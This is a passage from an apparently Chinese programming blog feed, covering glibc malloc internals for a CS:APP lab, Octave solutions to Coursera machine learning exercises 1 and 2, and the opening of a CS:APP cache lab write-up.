double links -- used only if free. */</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">malloc_chunk</span>* <span class="title">bk_nextsize</span>;</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>　　同样的，共有两种不同类型的chunk，第一种是已被占用的chunk，另一种是空闲的chunk，在malloc.c中，结构如下：<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// allocated chunk</span></span><br><span class="line">chunk-&gt; +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+</span><br><span class="line">  |             Size of previous chunk, if unallocated (P clear)  |</span><br><span class="line">  +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+</span><br><span class="line">  |             Size of chunk, in bytes                     |A|M|P|</span><br><span class="line">  mem-&gt; +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+</span><br><span class="line">  |             User data starts here...                          .</span><br><span class="line">  .                                                               .</span><br><span class="line">  .             (malloc_usable_size() bytes)                      .</span><br><span class="line">  .                                                               |</span><br><span class="line">nextchunk-&gt; +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+</span><br><span class="line">  |             (size of chunk, but used <span class="keyword">for</span> application data)    |</span><br><span class="line">  +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+</span><br><span class="line">  |             Size of next chunk, in bytes                |A|<span class="number">0</span>|<span class="number">1</span>|</span><br><span class="line">  +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+</span><br><span class="line"></span><br><span class="line"><span class="comment">// free chunk</span></span><br><span class="line">chunk-&gt; +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+</span><br><span class="line">  |             Size of previous chunk, if unallocated (P clear)  |</span><br><span class="line">  +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+</span><br><span class="line">  |             Size of chunk, in bytes                     |A|<span class="number">0</span>|P|</span><br><span class="line">  mem-&gt; +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+</span><br><span class="line">  |             Forward pointer to next chunk in <span class="built_in">list</span>             |</span><br><span class="line">  +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+</span><br><span class="line">  |             Back pointer to previous chunk in <span class="built_in">list</span>            |</span><br><span class="line">  +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+</span><br><span class="line">  |             Unused space (may be 0 bytes long)                .</span><br><span class="line">  .                                                               .</span><br><span class="line">  .                                                               |</span><br><span class="line">nextchunk-&gt; +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+</span><br><span class="line">  |             Size of chunk, in bytes                           |</span><br><span class="line">  +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+</span><br><span class="line">  |             Size of next chunk, in bytes                |A|<span class="number">0</span>|<span class="number">0</span>|</span><br><span class="line">  +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+</span><br></pre></td></tr></table></figure></p><p>　　其中，由于我们的块使用的是8字节对齐，因此，块的大小的最后3位一定是0。因此，我们同样可以把这三位利用起来。其中，最后一位P表示上一个块是否被占用，倒数第二位M表示该块是否来自于mmap函数，倒数第三位A表示当前块是否位于非主分配区。</p><h3 id="分配区"><a href="#分配区" class="headerlink" title="分配区"></a>分配区</h3><p>　　在malloc中，共有两种分配区。第一种是MAIN_ARENA，即主分配区，初始时进行内存分配均在主分配区中。第二种是NON_MAIN_ARENA，即非主分配区。初始时仅有主分配区。分配区具体和线程相关，当某个线程想要使用malloc获取一段内存时，在有采用多线程的情况下，会先使用arena_get获得当前线程所在的分配区，并且，为该分配区加上互斥锁。该宏定义如下：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">define</span> arena_get(ptr, size) do &#123; \</span></span><br><span class="line">      ptr = thread_arena;      \</span><br><span class="line">      arena_lock (ptr, size);      \</span><br><span class="line">  &#125; <span class="keyword">while</span> (<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> arena_lock(ptr, size) do &#123;      \</span></span><br><span class="line">      <span class="keyword">if</span> (ptr)      \</span><br><span class="line">        __libc_lock_lock (ptr-&gt;mutex);      \</span><br><span class="line">      <span class="keyword">else</span>      \</span><br><span class="line">        ptr = arena_get2 ((size), <span class="literal">NULL</span>);      \</span><br><span class="line">  &#125; <span class="keyword">while</span> (<span class="number">0</span>)</span><br></pre></td></tr></table></figure><p>　　倘若从该分配区上没有分配到所需的内存时，尝试从其他分配区中获取内存。如果找不到一个未加锁的分配区，则使用mmap增加一个非主分配区，并在该分配区上分配内存。</p><h3 id="bins"><a href="#bins" class="headerlink" title="bins"></a>bins</h3><p>　　在malloc中，由于块之间是用链表串起来的，每一条链表我们称之为bin。其中，每个bin中的大小比较接近，并且bin中的块按照大小排序，当大小相同时，则按照使用是否最近刚使用过排序，类似于LRU。在malloc中，总共有128个bin，按照大小等因素分类，总共有以下四种bin:</p><ol><li>Fast bin</li><li>Unsorted bin</li><li>Small bin</li><li>Large bin</li></ol><p>　　各个相邻bin间的大小间隔如下：</p><blockquote><p>64 bins of size       8<br>    32 bins of size      64<br>    16 bins of size     512<br>     8 bins of size    4096<br>     4 bins of size   32768<br>     2 bins of size  262144<br>     1 bin  of size what’s left</p></blockquote><h4 id="Fast-bin"><a href="#Fast-bin" class="headerlink" title="Fast bin"></a>Fast bin</h4><p>　　fast bin中存放的是大小小于64B的chunk，用于处理程序在运行过程中申请的较小的内存空间。通常情况下，fast bin中即使两个块相邻也不会主动合并(合并后如果malloc又申请了一些较小的内存，那么需要再次进行分割，耗费时间)。各个bin存放的块的大小以8B递增，同时，每一个bin中块的大小相同，分配时直接从头部摘除，同理，free的时候直接连接在了头部，加快了分配的效率。<br>　　在分配时，malloc优先从fast bin中寻找大小恰当的块。</p><h4 id="Unsorted-bin"><a href="#Unsorted-bin" class="headerlink" title="Unsorted bin"></a>Unsorted bin</h4><p>　　unsorted bin是bins的缓冲区，如同其名字所示，其中存放的bin的大小任意，并且也不需要按照大小顺序排序，当在small bin中找不到合适大小的块的时候，会在该bin中查找。当用户释放内存，或者fast bin合并后，或者发生了分割后剩下的块，会优先进入该bin。并且，查找后，把unsorted bin中的块放进对应的small bin或者large bin中。</p><h4 id="Small-bin"><a href="#Small-bin" class="headerlink" title="Small bin"></a>Small bin</h4><p>　　small bin中存放的是大小大于64B，小于512B的块，每个bin内的块大小相同，相邻的块之间大小相差8B。链表具体的各种操作和fast bin类似，不过两个相邻的块之间会发生合并，以减少碎片的产生。</p><h4 id="Large-bin"><a href="#Large-bin" class="headerlink" title="Large bin"></a>Large bin</h4><p>　　large bin中存放的是大小大于512B的块，其中，每个bin内块的大小不一，按照大小递减排序，大小相同则按照近期是否使用排序。分配时，完全遵循best fit，即满足大小要求的最小的块。分配后，会进行切割，剩下的块加入unsorted bin当中。</p><h4 id="else"><a href="#else" class="headerlink" title="else"></a>else</h4><p>　　除了上面几种bin，还有一些比较特殊的块，不包含在任何一个bin当中。</p><ol><li>大小超过128kb的块，将直接使用mmap函数。并且，所有M标记位为1的块，其他的标记位将被忽略，同时，这些块也不会进入到bin当中，当使用free函数时，这些块将直接通过unmmap还给操作系统</li><li>top chunk。这是一个特殊的块，位于堆的顶部。当所有的bin中的块的大小都不满足要求时，将会使用这个chunk。(注意，这依然满足best fit，top chunk被视为无限大)。如果top chunk的大小仍然不够，则会根据所需的大小使用mmap或者sbrk来拓展。</li></ol><h3 id="malloc-amp-free-2"><a href="#malloc-amp-free-2" class="headerlink" title="malloc &amp; free"></a>malloc &amp; free</h3><p>　　当我们调用malloc函数时，首先调用的是__libc_malloc函数，该函数做一些判断处理的工作，最后，malloc的具体实现逻辑交由__int_malloc函数执行。具体步骤如下：</p><ol><li>若是多线程，需要获取分配区的指针并上锁。否则跳过</li><li>计算所需的块的实际大小</li><li>如果所需的块大小小于fast bin的阈值，尝试从fast bin中获取。若获取失败，进入下一步。</li><li>若所需的块的大小位于small bin中，尝试从small bin中获取，若获取失败，进入第6步。若块的大小不位于small bin中，进入下一步。</li><li>调用malloc_consolidate函数，对fast bin进行拆除和合并，并扔进unsorted bin中。</li><li>进入循环，尝试从unsorted bin中获取，能获取到大于所需大小的，则进行切割并返回。同时，unsorted bin中大小位于small bin和large bin的块分别扔对应的bin中。</li><li>从large bin中按best fit查找，如果找到，则切割并返回。</li><li>从top chunk中获取，若top chunk 满足要求，则进行切割。若不满足要求，则扩容</li></ol><p>　　总之，对于某一个特定的请求，执行的顺序大致为： <strong>fast bin -&gt; small bin -&gt; unsorted bin -&gt; large bin -&gt; top chunk -&gt; extend_heap</strong></p><p>　　当我们调用free函数时，整体的过程也是类似的。</p><ol><li>首先，进行一些特殊判断后。如果该块属于mmap映射得到(M标志位)，直接unmmap还给操作系统。否则，进入下一步。</li><li>获取分配区的指针。大小如果小于fast bin的阈值，直接放入其中。如果下一个chunk也是空闲，则触发合并操作，并扔入unsorted bin中。大小如果大于该阈值，则放入unsorted bin中，并且检查是否需要合并。</li><li>倘若当前块与top chunk相邻，则与top chunk合并。并且，对于主分配区，top chunk如果大于收缩阈值(128KB)，则归还一部分给操作系统。</li></ol><h2 id="summary"><a href="#summary" class="headerlink" title="summary"></a>summary</h2><p>　　这个实验难度真的比较大。很多东西都没有提供，要靠自己写。并且，对于这个实验来说，非常容易出现segment fault，并且调试难度很大。像笔者花在调试上面的时间真的很多，常常因为漏打了标记之类的出错，然后就一直检查不出来了，很花时间。当然，这个时间我觉得的话还是很值得的，起码锻炼了自己调试的能力。建议如果要做这个实验的话，可以试着每过一段时间就保存一下，尤其是正确通过测试的时候，把文件复制到别的地方，然后再继续做一些优化，这样出了问题我们还可以比较一下。<br>　　转眼之间这个已经是倒数第二个实验了，寒假也已经到了尾声。这个时候还是希望自己不要太焦躁，开学了，心态也要放好一点，这样才能更好地进步。</p>]]></content>
      
      
      <categories>
          
          <category> csapp </category>
          
      </categories>
      
      
        <tags>
            
            <tag> csapp </tag>
            
            <tag> memory </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>Machine-learning-ex2</title>
      <link href="/2019/02/09/Machine-learning-ex2/"/>
      <url>/2019/02/09/Machine-learning-ex2/</url>
      
        <content type="html"><![CDATA[<h2 id="序"><a href="#序" class="headerlink" title="序"></a>序</h2><p>　　这个系列是关于coursera上吴恩达的<a href="https://www.coursera.org/learn/machine-learning/home/welcome" target="_blank" rel="noopener">machine learning课程</a>的文章。主要内容将包括每个week的编程练习作业，也可能会有一些笔记，知识的整理等，记录下自己学习这个课程的一些心得和体会。本文的主要内容是week 3的编程练习。<br>　　关于任务提交，octave的安装中的一些小问题，在<a href="https://littlecsd.net/2019/02/03/Machine-learning-ex1/#more" target="_blank" rel="noopener">上一篇文章</a>中已经有所提及，这里不再赘述。</p><h2 id="任务正文"><a href="#任务正文" class="headerlink" title="任务正文"></a>任务正文</h2><p>　　其实上一期任务如果能顺利做下来的话，这一周的任务应该算是很简单的了。基本上照着教程走就没有任何问题了，这里可能着重提一下一些其他的点吧。<br>　　需要填写的文件有：</p><blockquote><p>sigmoid.m 对每个元素求g(x) = 1 / (1 + e^(-x))<br>plotData.m 将数据可视化<br>costFunction.m 计算代价函数以及梯度<br>predict.m 对给定的theta和X，计算预测值(0 或 1)<br>costFunctionReg.m 计算正则化的代价函数以及梯度</p></blockquote><h3 id="plotData-m"><a href="#plotData-m" class="headerlink" title="plotData.m"></a>plotData.m</h3><p>　　这个函数同样的，我们只要照着pdf打即可。注意其中find函数的用法，可以直接获得向量y中所有y=1或y=0的位置</p><blockquote><p>pos = find(y==1);<br>neg = find(y==0);<br>plot(X(pos, 1), X(pos, 2), ‘k+’, ‘LineWidth’, 2, ‘MarkerSize’, 7);<br>plot(X(neg, 1), X(neg, 2), ‘ko’, ‘MarkerFaceColor’, ‘y’, ‘MarkerSize’, 7);</p></blockquote><h3 id="sidmoid-m"><a href="#sidmoid-m" class="headerlink" title="sidmoid.m"></a>sidmoid.m</h3><p>　　按照公式打即可。</p><blockquote><p>g = 1 ./ (1 + exp(-z));</p></blockquote><p>　　注意’./‘符号作用是用1去除以向量z中的所有元素，得到另一个和z维度相同的向量。exp(x)用于求e<sup>x</sup>。<br>　　另，关于这个g(x)函数，也就是logistic regression和linear regression的一个重要区别。因为在logistic regression，用h(x)表示预测值的话，h(x)的范围应该在(0, 1)当中，且应该是关于y轴上某一点对称。然后我们发现，g(x) = 1 / (1 + e<sup>-x</sup>)满足了我们所有的需求。当然，这里笔者有个问题，既然我们能采用这个函数来对数据进行转换，我们是不是也可以找到另一个同样满足要求的函数替换掉g(x)呢？</p><h3 id="costFunction"><a href="#costFunction" class="headerlink" title="costFunction"></a>costFunction</h3><p>　　在logistic regression中我们用h(x)=g(θ<sup>T</sup>X)代替了h(x)=θ<sup>T</sup>X。并且，我们不再采用平方差的形式，而是使用了log的形式，并且，对于y==0或者y==1的情况的计算公式应该是有区别的，因此，最后采用了这样的计算方法<br><img src="/2019/02/09/Machine-learning-ex2/1.png" alt="h(x)"><br>　　为了更便于我们的计算，我们将这两个公式合并在一起，就变成了下面的公式。当y==0或y==1时，这个公式分别变成了上面的两个公式。<br><img src="/2019/02/09/Machine-learning-ex2/2.png" alt="h(x)"><br>　　然后，就是关于梯度的计算。和之前的做法其实是一样的。如果不能理解的话还是建议画图。<br>　　具体计算方法如下：</p><blockquote><p>z = X * theta;<br>h = sigmoid(z);<br>J = -(y’ * log(h) + (1 - y’) * log(1 - h))/ m<br>grad = X’ * (h - y) / m;</p></blockquote><h3 id="prediction"><a href="#prediction" class="headerlink" title="prediction"></a>prediction</h3><p>　　对于给定的theta和X，我们可以求得当前theta和数据集的情况下θ<sup>T</sup>X的值，我们知道当x大于等于0.5的时候，我们得到的预测值为1，否则预测值为0。由此可以得到以下的写法：</p><blockquote><p>p = sigmoid(X * theta);<br>p(find(p &gt;= 0.5)) = 1;<br>p(find(p &lt; 0.5)) = 0;</p></blockquote><h3 id="costFunctionReg"><a href="#costFunctionReg" class="headerlink" title="costFunctionReg"></a>costFunctionReg</h3><p>　　对于正则化下的代价函数，难度稍微增大了一些。<br>　　首先是J的计算。和之前相比，现在的代价函数多了一个平方项，由于这一个项的存在，当足够多次的迭代过后，theta总会趋向与0，这就使得在预测函数中，某些项的系数会很快地趋近于0，这样就相当与去掉该项，从而避免了过拟合(overfit)的发生。当然，lambda的值必须取好一点。若取值过大，则会导致前面的log项的作用被稀释，甚至被忽略。最后导致求得的结果连我们给定的数据集都没办法拟合。若取值过小，起不到相应的作用，函数千方百计地拟合我们给定的数据集，使得曲线十分奇怪，过拟合依旧会发生。<br><img src="/2019/02/09/Machine-learning-ex2/3.png" alt="h(x)"><br><img src="/2019/02/09/Machine-learning-ex2/4.png" alt="h(x)"><br>　　接着，是梯度值的计算。为了向量化计算，这里引入了mtheta变量，其中除了第一个位置以外和theta完全相同，即θ<sub>0</sub>=0。这样的话，在计算的时候就不会造成影响。注意到正则化是不会对去涉及θ<sub>0</sub>=0的，笔者一开始在这里没注意，导致预测值出现了问题。</p><blockquote><p>mtheta = theta;<br>mtheta(1) = 0;</p><p>z = X * theta;<br>h = sigmoid(z);<br>J = -(y’ * log(h) + (1 - y’) * log(1 - h))/ m + mtheta’ * mtheta * lambda / (2 * m);</p><p>grad = X’ * (h - y) / m + mtheta * lambda / m;</p></blockquote><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>　　整体上来说，这个练习确实是偏简单了一些，更多的可能是想让我们稍微了解一下该如何去实现某一个特定的算法而已。当然，这个练习中还没有涉及multiple-class的情况，如果有的话，难度应该会更上一层了。接下来下一个周貌似就有相关的练习了，并且将要涉及到Neural Networks的一些东西了。加油吧。</p>]]></content>
      
      
      <categories>
          
          <category> machine learning </category>
          
      </categories>
      
      
        <tags>
            
            <tag> machine learning </tag>
            
            <tag> coursera </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>Machine-learning-ex1</title>
      <link href="/2019/02/03/Machine-learning-ex1/"/>
      <url>/2019/02/03/Machine-learning-ex1/</url>
      
        <content type="html"><![CDATA[<h2 id="序"><a href="#序" class="headerlink" title="序"></a>序</h2><p>　　这个系列是关于coursera上吴恩达的<a href="https://www.coursera.org/learn/machine-learning/home/welcome" target="_blank" rel="noopener">machine learning课程</a>的文章。主要内容将包括每个week的编程练习作业，也可能会有一些笔记，知识的整理等，记录下自己学习这个课程的一些心得和体会。本文的主要内容是week 2的编程练习。</p><h2 id="为什么要写这个系列？"><a href="#为什么要写这个系列？" class="headerlink" title="为什么要写这个系列？"></a>为什么要写这个系列？</h2><p>　　恩，可能只是一时冲动而已吧。首先，通过前面写的关于csapp系列文章，笔者觉得还是应该养成一个写博客的习惯吧。虽说写博客花的时间真的挺多的(前面的那几篇文章基本上至少半天，多的话要写一天甚至更多)，但很明显还是能感觉得到写完博客之后对于知识的理解还是更加清楚了一些，基本上重新看一遍能够回想起当时做的时候的思路历程。并且尽管这个教程算是很有名了，但是网上的一些资料质量还是参差不齐，不少都有着各种各样的问题。因此，笔者决定自己来写这个系列，一是为了加深理解，便于日后重新回顾，二是希望能够给恰好点开了这篇文章的同学一点点帮助。当然，由于笔者目前水平有限，且笔者也是第一次接触机器学习，难免会出现各种各样小问题，如果你发现了一些问题，也欢迎与我联系(点击右下角的小图标即可，可能要稍微等一会)。</p><h2 id="Octave-的安装问题"><a href="#Octave-的安装问题" class="headerlink" title="Octave 的安装问题"></a>Octave 的安装问题</h2><p>　　笔者的系统为 archlinux: 4.20.0<br>　　在安装过程中，出现了一些找不到共享库的情况，类似于这样的错误：</p><blockquote><p>error while loading shared libraries: libxxx.so</p></blockquote><p>　　遇到这种错误的时候，其实安装对应的库就行了，比如libreadline.so的库名称为readline。直接用对应的系统的下载命令即可。(笔者用的是 yay xxx命令)。不过，安装的时候记得看清楚提示，笔者就是因为没注意提示然后导致libreadline.so库丢了，然后开机都没办法，最后还是用U盘上的系统把这个库拷贝过来才解决的。</p><h2 id="任务正文"><a href="#任务正文" class="headerlink" title="任务正文"></a>任务正文</h2><h3 id="实验如何提交"><a href="#实验如何提交" class="headerlink" title="实验如何提交"></a>实验如何提交</h3><p>　　首先，在octave下，进入ex1文件夹中(octave可以使用linux系统的ls, cd命令)，然后直接输入submit即可，顺利的话很快就可以看到结果。做完所有任务的话看到的信息应该是这样:<br><img src="/2019/02/03/Machine-learning-ex1/1.png" alt="message"></p><p>　　不过，笔者在octave中，submit后就直接卡住了，应该是网络的问题，被墙了。笔者采用的解决办法是使用proxychains代理运行octave，然后submit就成功了。不同系统的话解决办法不一定相同，但总之注意好代理应该就可以了。下载的时候也是，笔者是采用proxychains + curl命令直接下载文件的。</p><h3 id="one-feature"><a href="#one-feature" class="headerlink" title="one feature"></a>one feature</h3><p>　　这个实验我们必须完成的函数仅为一个特征的情况，难度较小。one feature下我们需要填写的文件有：</p><blockquote><p>warmUpExercise.m   用于练习submit<br>plotData.m         用于data的可视化<br>computeCost.m      计算代价函数J(theta)<br>gradientDescent.m  实现梯度下降算法</p></blockquote><p>　　主要是为了测试一下submit能否正常运行。其中，第一个文件答案仅一行(注意不要漏了分号)。<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">A = eye(<span class="number">5</span>);</span><br></pre></td></tr></table></figure></p><p>　　第二个文件答案只要照着pdf打即可。<br><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">plot(x, y, 'rx', 'MarkerSize', 10);</span><br><span class="line">ylabel('Profit in $10,100s');</span><br><span class="line">xlabel('Population of City in 10,000s');</span><br></pre></td></tr></table></figure></p><p>　　注意，其中plot的用法(可以输入help plot查看)。’r’表示红色，同理可以换成’b’,’g’等。’x’表示用X来展示每个数据，同理可以换成’o’，表示用圆圈来展示等。最后’markerSize’表示每个标记的大小为10，可以修改这个数字自己看一下效果，也可以输入’LineWidth’，’color’等，具体效果可以自行尝试。</p><h3 id="代价函数的计算"><a href="#代价函数的计算" class="headerlink" title="代价函数的计算"></a>代价函数的计算</h3><p>　　这里代价函数计算单特征和多特征的写法是一样的，因此放在一起写。请务必保证每一步都可以理解清楚，建议画图加深理解。<br>　　首先，我们观察h<sub>θ</sub>(x)的计算公式：<br><img src="/2019/02/03/Machine-learning-ex1/2.png" alt="h(x)"><br>　　用X表示我们的m * (n+1)的数据集，其中，m表示example数量，n表示特征数量，则X是一个m * (n+1)的矩阵。<br>　　用theta表示我们当前的变量theta，时刻记住，theta是一个n维的向量(m * 1)，n与特征数相对应。因此，用向量化的思想，h(x)即可以表示为<b>X * theta</b>，注意矩阵乘法是不可交换的。相乘之后我们得到一个m维的向量，即m个example各自对应的预测值，再减去实际值y(y同样是一个m维的向量)，即得到我们误差向量c。<br><img src="/2019/02/03/Machine-learning-ex1/3.png" alt="h(x)"><br>　　而最后我们要的应该是每一个误差的平方再除以2m，可以用c’和c相乘即可。<br>　　最后的答案为(c’ * c 也可以写成 sum (c .* c)，没有区别)。</p><blockquote><p>c = X * theta - y;<br>J = c’ * c / (2 * m);</p></blockquote><h3 id="梯度下降算法的实现"><a href="#梯度下降算法的实现" class="headerlink" title="梯度下降算法的实现"></a>梯度下降算法的实现</h3><p>　　梯度下降算法多特征理解起来可能还是有一点难，强烈建议画图，并且通过图好好理解。<br>　　首先，还是先来看一下公式。对第j个theta，我们要进行如下的更新，而且所有的theta应该同时更新。注意，具体计算的时候，我们把theta看成是一个n + 1维的向量。<br><img src="/2019/02/03/Machine-learning-ex1/4.png" alt="h(x)"><br>　　即我们可以看成：<br><img src="/2019/02/03/Machine-learning-ex1/5.png" alt="h(x)"><br>　　这个时候别忘了，在上面的公式中，我们的变量是theta，也就是说，i可以理解成是一个常数。右边的x<sup>(i)</sup>应该也是和theta对应的一个m维的向量，而X即我们的数据集。而i是常数，因此，h<sub>θ</sub>(x<sup>(i)</sup>) - y<sup>(i)</sup>也是一个常数。h<sub>θ</sub>(x)-y应该是一个m维的向量。<br>　　用c表示该向量，则X’ * c 即可以表示上面的公式中sigma右边试子的值。<br>　　因此，最后的答案为:</p><blockquote><p>c = X * theta - y;<br>theta = theta - X’ * c * alpha / m;</p></blockquote><p>　　两个文件写完之后，我们可以运行ex1，查看我们的结果和预期的结果是否相同，最后成功的话应该可以看到一条直线基本上能拟合我们的数据，说明应该是成功了。这个时候我们就可以submit上去了。</p><h3 id="multiple-features"><a href="#multiple-features" class="headerlink" title="multiple features"></a>multiple features</h3><p>　　这个练习后面又有一个选择性的练习，即多特征下的梯度下降，整体思路其实很相似。<br>　　对于多个特征的数据，很多情况下，我们需要先将其标准化，以减少迭代次数。这里，我们使用mean和std函数帮助我们的计算。</p><blockquote><p>mu = mean(X);<br>sigma = std(X);<br>X_norm = (X - mu) ./ sigma;</p></blockquote><p>　　其中，X为我们的数据集，而X中的每一列即表示我们某一个特征的所有数据。mean(X)求出矩阵X每一列的平均值，存储在向量mu中。std(X)求出每一列的标准差，存储在向量sigma中。最后对X中的每一列，每一行的数字减去该列的平均值，再除以方差即完成标准化的步骤。<br>　　然后，我们需要完成computeCostMulti.m 和 gradientDescentMulti.m 文件，实现多特征的梯度下降算法，具体写法上面已经有写，这里不再赘述。倘若没有问题，输入ex1_multi后，我们应该可以看到以下的输出：<br><img src="/2019/02/03/Machine-learning-ex1/6.png" alt="h(x)"><br>　　然后，我们需要修改ex1_multi中的值，有h(x)的计算公式，我们很容易得到price应该是：</p><blockquote><p>price = [1,1650,3]  theta;</p></blockquote><p>　　好了，这个时候我们倘若运行，会发现预测得到的price极其大，而我们通过看几个数据，发现price应该是在30w上下的，是我们梯度下降做错了吗？其实并不是，这里有一个坑。我们前面用到了特征的归一化，而对于我们要预测的值，我们并没有进行处理，这个时候得到的答案显然就是错误的。正确的答案应该是：</p><blockquote><p>price = [1,([1650,3] - mu) ./ sigma] * theta;</p></blockquote><p>　　注意，计算mu和sigma的时候我们还没有的x<sub>0</sub>还没有加上去。因此预测值向量应该是[1,([1650,3]-mu) ./ sigma]。最后得到的答案是29w多一点。<br>　　接着，文档中又给出了一个选择alpha的测试，有兴趣的话可以改一下ex1_multi中的alpha变量，看一下收敛需要的迭代次数的变化。<br>　　最后，是一个标准方程的测试，我们将公式直接输入进去即可。具体原理暂时不懂，等学完线性代数再去理解吧。</p><blockquote><p>theta = pinv(X’ * X) * X’ * y;</p></blockquote><h2 id="最后"><a href="#最后" class="headerlink" title="最后"></a>最后</h2><p>　　到这里，整个实验的所有题目就结束了，然而这样真的就全部完了吗？笔者还发现了一个小细节，不知道是不是作者故意留下来的。如果你写法和我一样的话，你可能也会看到这样的输出：<br><img src="/2019/02/03/Machine-learning-ex1/7.png" alt="h(x)"><br>　　我们发现，梯度下降得到的答案和标准方程得到的答案有一定的差异。这个应该就算是误差了，当迭代次数越来越多的时候，梯度下降得到的值应该会越来越可靠。从预测值中我们看到，虽然有误差，但其实还可以接受。然而，我们看一下两种方法得到的theta，差别却非常大。这说明了我们用梯度下降算法得到的应该是某一个局部最优解，而这个局部最优解和全局最优解差别很小。</p>]]></content>
      
      
      <categories>
          
          <category> machine learning </category>
          
      </categories>
      
      
        <tags>
            
            <tag> machine learning </tag>
            
            <tag> coursera </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>csapp-Cachelab</title>
      <link href="/2019/01/29/csapp-Cachelab/"/>
      <url>/2019/01/29/csapp-Cachelab/</url>
      
        <content type="html"><![CDATA[<h3 id="序"><a href="#序" class="headerlink" title="序"></a>序</h3><p>　　这是csapp系列的第六篇文章。具体题目请见<a href="http://csapp.cs.cmu.edu/3e/labs.html" target="_blank" rel="noopener">官网</a>。本文主要讲csapp中的cache lab的一些问题以及解决办法。如果有什么写得不好的地方，欢迎联系我修改(右下角小图标点开即可对话，可能要稍微等一会)。<br>　　建议在开始实验以前，先把官方的<a href="http://csapp.cs.cmu.edu/3e/cachelab.pdf" target="_blank" rel="noopener">资料</a>看下。如果有时间的话，也可以看一下web aside里面blocking相关的一些知识，对于理解题目思路有一定帮助。</p><h3 id="cache-lab"><a href="#cache-lab" class="headerlink" title="cache lab"></a>cache lab</h3><p>　　这个实验总共只有两个部分，part A 要求我们写一个cache simulator, 总体来说比较简单，注意好各个指令间的区别就可以了。part B 是要求我们在特定的条件下对矩阵转置进行适当的优化，有一定难度。</p><blockquote><p>主要实验文件<br>traces 文件夹 存放用于part A测试的一些文件<br>csim.c 完成part A 需要填写的文件<br>trans.c 完成part B 需要填写的文件<br>test-csim 和 test-trans 分别用于对part A 和 part B的测试<br>driver.py 用于对part A 和 part B 整体进行测试</p></blockquote><blockquote><p>实验目的：<br>part A 主要加深了我们对于缓存的理解，要求能够理解最简单的缓存在机器中是怎样实现的，能够解决写入缓存，读取缓存的一些问题。<br>part B 主要通过优化转置这个任务，加深我们对cache miss的理解，懂得如何尽量减少cache miss 的产生，以提高程序效率。</p></blockquote><h3 id="实验正文"><a href="#实验正文" class="headerlink" title="实验正文"></a>实验正文</h3><h4 id="part-A"><a href="#part-A" class="headerlink" title="part A"></a>part A</h4><p>　　part A 总体没有什么比较好讲的地方。最主要就是确定好数据结构，理解清楚L S M三个指令之间的区别就可以了。不过笔者在这道题上面却卡了特别久，原因在于对于这几个指令的理解不够深，然后没怎么思考就直接写，导致出了一些问题，找bug花了很长时间，最后发现从一开始的思路就错了，于是才推倒重来。<br>　　首先，我们需要用到getopt函数来解析命令行参数。这个函数的用法网上有很多，直接搜索就可以找到很多有用的资料，这里不赘述了。<br>　　然后，我们来看一下对于四个指令，I指令我们不需要管，可以直接忽略。剩下L S M三个。一个合格的cache应该做到：</p><ol><li>对于load指令，从内存中读取，首先我们需要判断要读取的地址是否有放在缓存当中，有的话就是cache 